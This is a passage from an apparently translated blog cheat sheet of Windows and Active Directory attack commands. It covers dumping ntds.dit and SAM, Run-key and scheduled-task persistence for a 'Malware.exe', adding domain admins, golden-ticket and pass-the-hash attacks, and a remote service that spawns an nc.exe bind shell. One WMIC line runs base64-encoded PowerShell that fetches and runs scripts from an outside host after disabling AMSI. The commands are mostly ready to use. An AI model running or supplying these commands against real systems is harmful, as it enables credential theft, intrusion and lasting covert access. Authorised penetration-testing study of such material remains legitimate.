class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\vssadmin create shadow /for=C:</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\ntds\ntds.dit</span><br><span class="line">.</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SYSTEM</span><br><span class="line">.</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SAM</span><br><span class="line">.</span><br><span class="line">reg SAVE HKLM\SYSTEM c:\SYS</span><br><span class="line">vssadmin delete shadows /for= [/oldest | /all | /shadow=]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTDS.dit</span><br></pre></td></tr></table></figure><h2 id="5-22-SeBackupPrivlege-Dump-NTDS-dit"><a href="#5-22-SeBackupPrivlege-Dump-NTDS-dit" class="headerlink" title="5.22 SeBackupPrivlege - Dump NTDS.dit"></a>5.22 SeBackupPrivlege - Dump NTDS.dit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line">Import-Module .\SeBackupPrivilegeUtils.dll</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Get-SeBackupPrivilege</span><br><span class="line">SeBackupPrivilege is disabled</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Set-SeBackupPrivilege</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Get-SeBackupPrivilege</span><br><span class="line">SeBackupPrivilege is enabled</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Copy-FileSeBackupPrivilege P:\Windows\System32\ntds.dit C:\m0chan\ntds.dit -Overwrite</span><br><span class="line">Copied 12582912 bytes</span><br><span class="line"></span><br><span class="line">Use diskshadow to mount a shadow copy and then copy Windows\system32\ntds.dit </span><br><span class="line"></span><br><span class="line">Remember and not use C:\Windows\ntds\ntds.dit</span><br><span class="line"></span><br><span class="line">reg.exe save hklm\system c:\m0chan\SYSTEM.bak</span><br></pre></td></tr></table></figure><h1 id="0x06-权限维持"><a href="#0x06-权限维持" class="headerlink" title="0x06 权限维持"></a>0x06 权限维持</h1><h2 id="6-1-SSH-Shuttle"><a href="#6-1-SSH-Shuttle" class="headerlink" title="6.1 SSH Shuttle"></a>6.1 SSH Shuttle</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run -r root@10.10.110.123 172.16.1.0/24 -e &quot;ssh -i Root.key&quot;</span><br></pre></td></tr></table></figure><h2 id="6-2-SharPersist"><a href="#6-2-SharPersist" class="headerlink" title="6.2 SharPersist"></a>6.2 SharPersist</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/fireeye/SharPersist</span><br><span class="line"></span><br><span class="line">C# Libary Designed by FireEye to aid with Persistance using various techniques such as </span><br><span class="line"></span><br><span class="line">KeePass Backdoor</span><br><span class="line">Reg Key</span><br><span class="line">Sch Task Backdoor</span><br><span class="line">Startup Folder (Link File)</span><br><span class="line">Service Backdoor</span><br><span class="line"></span><br><span class="line">See there github linked above for full Syntax, very cool work</span><br></pre></td></tr></table></figure><h2 id="6-3-SharpDoor"><a href="#6-3-SharpDoor" class="headerlink" title="6.3 SharpDoor"></a>6.3 SharpDoor</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/infosecn1nja/SharpDoor.git</span><br><span class="line"></span><br><span class="line">SharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently only support for Windows 10.</span><br><span class="line"></span><br><span class="line">execute-assembly /root/Toolkits/SharpBinaries/SharpDoor.exe</span><br></pre></td></tr></table></figure><h2 id="6-4-自动运行注册表"><a href="#6-4-自动运行注册表" class="headerlink" title="6.4 自动运行注册表"></a>6.4 自动运行注册表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]</span><br></pre></td></tr></table></figure><h2 id="6-5-Run-amp-Run-Once"><a href="#6-5-Run-amp-Run-Once" class="headerlink" title="6.5 Run &amp; Run Once"></a>6.5 Run &amp; Run Once</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v WindowsUpdate</span><br><span class="line">/t REG_SZ /d &quot;C:\Temp\SoftwareUpdate\Malware.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="6-6-计划任务"><a href="#6-6-计划任务" class="headerlink" title="6.6 计划任务"></a>6.6 计划任务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#Note - Beaware. some EDR/Endpoint Solutions detect Scheduled Tasks being created and trigger alerts.</span><br><span class="line"></span><br><span class="line">schtasks /create /sc minute /mo 1 /tn &quot;Malware&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe</span><br><span class="line"></span><br><span class="line">This will run Malware.exe every minute forever.</span><br><span class="line"></span><br><span class="line"># Run Malware.exe every day at 06:00am</span><br><span class="line">schtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc daily /st 06:00</span><br><span class="line"></span><br><span class="line"># Runs a task each time the user&apos;s session is idle for 5 minutes.</span><br><span class="line">schtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onidle /i 5</span><br><span class="line"></span><br><span class="line"># Runs a a task as SYSTEM when User Logs in.</span><br><span class="line">schtasks /create /ru &quot;NT AUTHORITY\SYSTEM&quot; /rp &quot;&quot; /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onlogon</span><br></pre></td></tr></table></figure><h2 id="6-7-Windows启动文件夹"><a href="#6-7-Windows启动文件夹" class="headerlink" title="6.7 Windows启动文件夹"></a>6.7 Windows启动文件夹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This has been around for years as basically every version of Windows contains a startup folder. </span><br><span class="line"></span><br><span class="line">Windows 10 - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br><span class="line"></span><br><span class="line">Current User Startup - C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><h2 id="6-8-EXE-DLL劫持"><a href="#6-8-EXE-DLL劫持" class="headerlink" title="6.8 EXE / DLL劫持"></a>6.8 EXE / DLL劫持</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Look for any missing DLL&apos;s or EXE&apos;s that common programs are calling on startup and over write them with your payload/malware.</span><br><span class="line"></span><br><span class="line">Also if you are localadmin/system you could provide over write a normal service binary or DLL, providing you don&apos;t break the execution.</span><br></pre></td></tr></table></figure><h2 id="6-9-添加用户帐号"><a href="#6-9-添加用户帐号" class="headerlink" title="6.9 添加用户帐号"></a>6.9 添加用户帐号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user m0chan /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; m0chan /add /domain</span><br><span class="line">net localgroup &quot;Administrators&quot; /add</span><br><span class="line">net user m0chan /domain /comment:&quot;Your Blueteam Fucking Sucks&quot;</span><br></pre></td></tr></table></figure><h4 id="6-10-Kerberos的持久性"><a href="#6-10-Kerberos的持久性" class="headerlink" title="6.10 Kerberos的持久性"></a>6.10 Kerberos的持久性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">We can dump Kerberos tickets and inject them in session when deemed relevant however tickets have a low life span unless explically requested for 7 days. </span><br><span class="line"></span><br><span class="line">They can be injected into session with mimikatz or Rebeus. </span><br><span class="line"></span><br><span class="line">But let&apos;s say we have pwned a DC and got the KRBTGT Hash we can generate a golden ticket with a 10 year life span.</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:utilisateur.chocolate.kirbi </span><br><span class="line"></span><br><span class="line">SID is the domain SID</span><br><span class="line"></span><br><span class="line">Inject Ticket</span><br><span class="line"></span><br><span class="line">kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi</span><br><span class="line"></span><br><span class="line">Can also inject kirbi with Rebeus</span><br></pre></td></tr></table></figure><h1 id="0x07-横向运动"><a href="#0x07-横向运动" class="headerlink" title="0x07 横向运动"></a>0x07 横向运动</h1><h2 id="7-1-Plink"><a href="#7-1-Plink" class="headerlink" title="7.1 Plink"></a>7.1 Plink</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS</span><br><span class="line"></span><br><span class="line">#Windows 1803 Built in SSH Client (By Default)</span><br><span class="line"></span><br><span class="line">ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS</span><br></pre></td></tr></table></figure><h2 id="7-2-Powershell端口转发"><a href="#7-2-Powershell端口转发" class="headerlink" title="7.2 Powershell端口转发"></a>7.2 Powershell端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=fromport listenaddress=fromip connectport=toport connectaddress=toip</span><br><span class="line"></span><br><span class="line">Permanent ^^</span><br><span class="line"></span><br><span class="line">Requires iphlpsvc service to be enabled</span><br><span class="line"></span><br><span class="line">fromport: the port number to listen on, e.g. 80</span><br><span class="line">fromip: the ip address to listen on, e.g. 192.168.1.1</span><br><span class="line">toport: the port number to forward to</span><br><span class="line">toip: the ip address to forward to</span><br></pre></td></tr></table></figure><h2 id="7-3-Invoke-SocksProxy"><a href="#7-3-Invoke-SocksProxy" class="headerlink" title="7.3 Invoke-SocksProxy"></a>7.3 Invoke-SocksProxy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/p3nt4/Invoke-SocksProxy/</span><br><span class="line"></span><br><span class="line">Local Socks4 Proxy on 1080</span><br><span class="line"></span><br><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-SocksProxy -bindPort 1080</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Reverse Socks Proxy on Remote Machine Port 1080</span><br><span class="line"></span><br><span class="line"># On the remote host: </span><br><span class="line"># Generate a private key and self signed cert</span><br><span class="line">openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem</span><br><span class="line"></span><br><span class="line"># Get the certificate fingerprint to verify it:</span><br><span class="line">openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d &quot;=&quot; -f 2 | tr -d &quot;:&quot;</span><br><span class="line"></span><br><span class="line"># Start the handler</span><br><span class="line">python ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key</span><br><span class="line"></span><br><span class="line"># On the local host:</span><br><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 </span><br><span class="line"></span><br><span class="line"># Go through the system proxy:</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy</span><br><span class="line"></span><br><span class="line"># Validate certificate</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy -certFingerprint &apos;93061FDB30D69A435ACF96430744C5CC5473D44E&apos;</span><br></pre></td></tr></table></figure><h2 id="7-4-Socat-for-Windows"><a href="#7-4-Socat-for-Windows" class="headerlink" title="7.4 Socat for Windows"></a>7.4 Socat for Windows</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/StudioEtrange/socat-windows</span><br><span class="line"></span><br><span class="line">Generate SSL Cert for Encryption</span><br><span class="line">openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key</span><br><span class="line"></span><br><span class="line">Server : socat OPENSSL-LISTEN:443,cert=/cert.pem -</span><br><span class="line">Client : socat - OPENSSL:localhost:443</span><br><span class="line"></span><br><span class="line">#Port Forward</span><br><span class="line"></span><br><span class="line">socat OPENSSL-LISTEN:443,cert=/cert.pem,fork TCP:202.54.1.5:443</span><br><span class="line"></span><br><span class="line">All SSL Connections will be redirected to 202.54.1.5:443</span><br><span class="line"></span><br><span class="line">#Non SSL Port Forward</span><br><span class="line">socat TCP-LISTEN:80,fork TCP:202.54.1.5:80</span><br></pre></td></tr></table></figure><h2 id="7-5-SharpExec"><a href="#7-5-SharpExec" class="headerlink" title="7.5 SharpExec"></a>7.5 SharpExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/anthemtotheego/SharpExec</span><br><span class="line"></span><br><span class="line">C# Implementation of Conventional Lateral Movement Techniques, such as </span><br><span class="line"></span><br><span class="line">-WMIExec - Semi-Interactive shell that runs as the user. Best described as a less mature version of Impacket&apos;s wmiexec.py tool.</span><br><span class="line"></span><br><span class="line">-SMBExec - Semi-Interactive shell that runs as NT Authority\System. Best described as a less mature version of Impacket&apos;s smbexec.py tool.</span><br><span class="line"></span><br><span class="line">-PSExec (like functionality) - Gives the operator the ability to execute remote commands as NT Authority\System or upload a file and execute it with or without arguments as NT Authority\System.</span><br><span class="line"></span><br><span class="line">-WMI - Gives the operator the ability to execute remote commands as the user or upload a file and execute it with or without arguments as the user.</span><br></pre></td></tr></table></figure><h2 id="7-6-安全套接字漏斗"><a href="#7-6-安全套接字漏斗" class="headerlink" title="7.6 安全套接字漏斗"></a>7.6 安全套接字漏斗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html#ssf</span><br><span class="line">#git clone https://github.com/securesocketfunneling/ssf.git</span><br><span class="line"></span><br><span class="line">Massive shout out to 0xdf for explaining this perfectly in his article. Couldnt have done it better myself.</span><br></pre></td></tr></table></figure><h2 id="7-7-凿子（通过SSH保护的HTTP上的快速TCP隧道）"><a href="#7-7-凿子（通过SSH保护的HTTP上的快速TCP隧道）" class="headerlink" title="7.7 凿子（通过SSH保护的HTTP上的快速TCP隧道）"></a>7.7 凿子（通过SSH保护的HTTP上的快速TCP隧道）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html</span><br></pre></td></tr></table></figure><h2 id="7-8-CrackMapExec"><a href="#7-8-CrackMapExec" class="headerlink" title="7.8 CrackMapExec"></a>7.8 CrackMapExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-lateral-movement/</span><br></pre></td></tr></table></figure><h2 id="7-9-WMIC-Spawn-Process"><a href="#7-9-WMIC-Spawn-Process" class="headerlink" title="7.9 WMIC Spawn Process"></a>7.9 WMIC Spawn Process</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:WS02 /user:DOMAIN\m0chan /password:m0chan process call create &quot;powershell.exe -Enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ARwBvAG8AZABuAGkAZwBoAHQALgBwAHMAMQAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA==&quot;</span><br></pre></td></tr></table></figure><h2 id="7-10-WinRS"><a href="#7-10-WinRS" class="headerlink" title="7.10 WinRS"></a>7.10 WinRS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs</span><br><span class="line"></span><br><span class="line">winrs [/&lt;parameter&gt;[:&lt;value&gt;]] &lt;command&gt;  </span><br><span class="line"></span><br><span class="line">winrs /r:https://contoso.com command</span><br><span class="line"></span><br><span class="line">winrs /r:http://[1080:0:0:0:8:800:200C:417A]:80 command  </span><br><span class="line"></span><br><span class="line">winrs /r:myserver /ad /u:administrator /p:$%fgh7 dir \\anotherserver\share</span><br></pre></td></tr></table></figure><h2 id="7-11-Invoke-WMIExec-ps1"><a href="#7-11-Invoke-WMIExec-ps1" class="headerlink" title="7.11 Invoke-WMIExec.ps1"></a>7.11 Invoke-WMIExec.ps1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target 10.10.14.14 -Username rweston_da -Hash 3ff61fa259deee15e4042159d</span><br><span class="line">7b832fa -Command &quot;net user user pass /add /domain&quot;</span><br><span class="line"></span><br><span class="line">PS C:\users\user\Downloads&gt; Invoke-WMIExec -Target 10.10.120.1 -Username m0chan -Hash 3ff61fa259deee15e4042159d</span><br><span class="line">7b832fa -Command &quot;net group &quot;&quot;Domain Admins&quot;&quot; m0chan /add /domain&quot;</span><br></pre></td></tr></table></figure><h2 id="7-12-Powershell调用命令（需要端口5985）"><a href="#7-12-Powershell调用命令（需要端口5985）" class="headerlink" title="7.12 Powershell调用命令（需要端口5985）"></a>7.12 Powershell调用命令（需要端口5985）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$secpasswd = ConvertTo-SecureString &apos;pass&apos; -AsPlainText -Force</span><br><span class="line">$cred = New-Object System.Management.Automation.PSCredential(&apos;m0chan\user&apos;, $secpasswd)</span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock &#123;whoami&#125;</span><br></pre></td></tr></table></figure><h2 id="7-13-PSExec"><a href="#7-13-PSExec" class="headerlink" title="7.13 PSExec"></a>7.13 PSExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\dc01.m0chanAD.local cmd.exe</span><br></pre></td></tr></table></figure><h2 id="7-14-Powershell-Remoting"><a href="#7-14-Powershell-Remoting" class="headerlink" title="7.14 Powershell Remoting"></a>7.14 Powershell Remoting</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$secpasswd = ConvertTo-SecureString &apos;password&apos; -AsPlainText -Force</span><br><span class="line">$cred = New-Object System.Management.Automation.PSCredential(&apos;WS02\USER&apos;, $secpasswd)</span><br><span class="line"></span><br><span class="line">$Session = New-PSSession -ComputerName FileServer -Credential $cred</span><br><span class="line">Enter-PSSession $Session</span><br></pre></td></tr></table></figure><h2 id="7-15-通过SMB配置远程服务（在目标计算机上需要本地管理员）"><a href="#7-15-通过SMB配置远程服务（在目标计算机上需要本地管理员）" class="headerlink" title="7.15 通过SMB配置远程服务（在目标计算机上需要本地管理员）"></a>7.15 通过SMB配置远程服务（在目标计算机上需要本地管理员）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.0.15 [password] /u:DOMAIN\m0chan</span><br><span class="line"></span><br><span class="line">sc \\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k COMMAND&quot;</span><br><span class="line">sc \\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k &lt;c:\tools\nc.exe -L -p &lt;port&gt; -e cmd.exe&gt;&quot;</span><br><span class="line">sc \\192.168.0.15 start &lt;service_name&gt;</span><br></pre></td></tr></table></figure><h2 id="7-16-Pass-The-Hash"><a href="#7-16-Pass-The-Hash" class="headerlink" title="7.16 Pass-The-Hash"></a>7.16 Pass-The-Hash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec &lt;ip&gt; -u &lt;user&gt; -H &quot;&lt;lm&gt;&quot; -x &quot;&lt;msfvenom psh-cmd&gt;&quot;</span><br><span class="line"></span><br><span class="line">impacket-wmiexec &lt;user&gt;@&lt;ip&gt; -hashes &lt;lm:nt&gt;</span><br><span class="line"></span><br><span class="line">pth-winexe -U &lt;user&gt;%&lt;ntlm&gt; //&lt;ip&gt; &quot;&lt;msfvenom psh-cmd&gt;&quot;</span><br><span class="line"></span><br><span class="line">python wmiexec.py -hashes :&lt;hash&gt; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;ntlm&gt; /v:&lt;ip&gt;:3389 /dynamic-resolution</span><br><span class="line"></span><br><span class="line">sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</span><br></pre></td></tr></table></figure><h2 id="7-17-Pass-The-Ticket"><a href="#7-17-Pass-The-Ticket" class="headerlink" title="7.17 Pass-The-Ticket"></a>7.17 Pass-The-Ticket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line"></span><br><span class="line">Rebeus monitor /interval:30 </span><br><span class="line"></span><br><span class="line">Monitoring logon sessions every 30 seconds so I can pinch Kerb tickets</span><br><span class="line"></span><br><span class="line">Reubus will now give you a Kerberos ticket in base64 which you can pass with</span><br><span class="line"></span><br><span class="line">Rubeus.exe ptt /ticket:[base64blobhere]</span><br><span class="line"></span><br><span class="line">We can now request TGS service tickets to access network resources as this user</span><br></pre></td></tr></table></figure><h1 id="0x08-混淆-规避技术"><a href="#0x08-混淆-规避技术" class="headerlink" title="0x08 混淆/规避技术"></a>0x08 混淆/规避技术</h1><h2 id="8-1-调用混淆"><a href="#8-1-调用混淆" class="headerlink" title="8.1 调用混淆"></a>8.1 调用混淆</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-Obfuscation</span><br><span class="line"></span><br><span class="line">Can obfusacte Scripts &amp; Commands </span><br><span class="line"></span><br><span class="line">Obfusacte script from remote url </span><br><span class="line"></span><br><span class="line">SET SCRIPTPATH https://thisdosentexist.m0chan.com/Invoke-Mimikatz.ps1</span><br><span class="line"></span><br><span class="line">Can also 